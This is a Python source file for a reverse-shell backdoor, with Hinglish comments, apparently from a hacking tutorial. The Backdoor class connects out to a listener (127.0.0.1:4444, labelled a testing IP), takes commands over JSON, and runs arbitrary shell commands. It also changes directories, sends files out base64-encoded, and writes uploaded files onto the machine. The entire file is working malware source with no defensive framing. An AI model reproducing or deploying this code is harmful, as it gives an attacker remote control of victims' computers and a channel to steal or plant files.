import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
        except Exception:
            return "[-] Error during command execution."

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        # File ko bytes (rb) mein read karke base64 text banayega
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        # Base64 text ko wapas file bytes (wb) mein badlega
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    # Folder change karne ka logic
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    # File read karke bhejega
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    # File receive karke write karega
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            
            self.reliable_send(command_result)

# Backdoor start (Testing IP)
my_backdoor = Backdoor("127.0.0.1", 4444)
my_backdoor.run()
